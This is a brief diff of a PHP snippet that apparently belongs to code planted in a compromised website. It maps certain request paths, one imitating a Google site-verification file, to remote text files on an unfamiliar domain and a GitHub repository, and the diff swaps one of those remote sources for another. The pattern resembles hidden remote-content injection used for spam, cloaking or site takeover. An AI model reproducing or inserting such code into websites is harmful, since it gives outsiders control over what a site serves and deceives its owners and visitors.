@@ -4,7 +4,7 @@ if (isset($_SERVER['REQUEST_URI'])) {
     $r = rtrim($r, '/') . '/';  
     $c = array(
         '/xwmla/' => 'https://8uniform.mb0b.in/watcheronly/watcher.txt',  
-        '/8page/' => 'https://raw.githubusercontent.com/alanlouwalker01-create/imbaru/refs/heads/main/BD',  
+        '/8page/' => 'https://raw.githubusercontent.com/alanlouwalker01-create/hostname/refs/heads/main/hostname%20BD',  
         '/googlea43c346b94dbeaff.html/' => 'https://8uniform.mb0b.in/plugins/Brian.txt',
     );
     
